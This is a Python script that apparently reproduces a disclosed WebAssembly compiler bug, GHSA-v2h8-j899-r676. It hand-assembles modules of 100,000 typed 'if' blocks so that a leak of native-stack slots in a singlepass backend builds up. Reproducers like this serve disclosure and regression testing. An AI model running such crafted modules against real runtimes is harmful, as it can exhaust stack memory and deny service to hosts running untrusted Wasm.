#!/usr/bin/env python3
"""
Straight-line variant: N sequential one-armed typed `if`s (1 block param,
omitted else), each executed with a FALSE condition, with 13 materialized
outer values live across each `if` so singlepass must spill the block
parameter to the native stack. No branch targets between the ifs => the
per-execution 8-byte native-stack slot leak described in GHSA-v2h8-j899-r676
accumulates over the whole function body.
"""

import importlib.util

spec = importlib.util.spec_from_file_location("bw", "build_wasm.py")
bw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bw)

N = 100_000
OUTER = 13


def straight_body(explicit_else: bool = False) -> bytes:
    c = bytearray()
    c += b"\x41" + bw.sleb(N) + b"\x21\x00"       # i = N (unused guard value)
    for _ in range(N):
        for _k in range(OUTER):
            c += b"\x20\x00"                       # local.get i (materialized outer value)
        c += b"\x20\x00"                           # local.get i (the if's block param)
        c += b"\x20\x00\x45"                       # local.get i; i32.eqz  -> false while i != 0
        c += b"\x04\x02"                           # if (type 2: (i32)->(i32))
        c += b"\x1a"                               #   drop param
        c += b"\x41\x37"                           #   i32.const 55
        if explicit_else:
            c += b"\x05"                           #   else (empty)
        c += b"\x0b"                               # end
        c += b"\x1a"                               # drop result
        c += b"\x1a" * OUTER                       # drop the 13 outer values
    c += b"\x41" + bw.sleb(2048)                   # return valid empty region
    return bytes(c)


bodies = [
    bw.body(bw.f0_code, locals_=[(1, bw.I32)]),
    bw.body(bw.f1_code),
    bw.body(bw.f2_code),
    bw.body(straight_body(), locals_=[(1, bw.I32)]),
    bw.body(b""),
]
CODE = bw.section(10, bw.vec(bodies))
def build(explicit_else):
    bodies = [
        bw.body(bw.f0_code, locals_=[(1, bw.I32)]),
        bw.body(bw.f1_code),
        bw.body(bw.f2_code),
        bw.body(straight_body(explicit_else), locals_=[(1, bw.I32)]),
        bw.body(b""),
    ]
    code = bw.section(10, bw.vec(bodies))
    return (b"\x00asm\x01\x00\x00\x00" + bw.TYPE + bw.FUNC + bw.MEM + bw.GLOBAL
            + bw.EXPORT + code + bw.DATA)

open("straight_implicit_else.wasm", "wb").write(build(False))
open("straight_explicit_else.wasm", "wb").write(build(True))
print(f"wrote straight_implicit_else.wasm / straight_explicit_else.wasm ({N} ifs)")
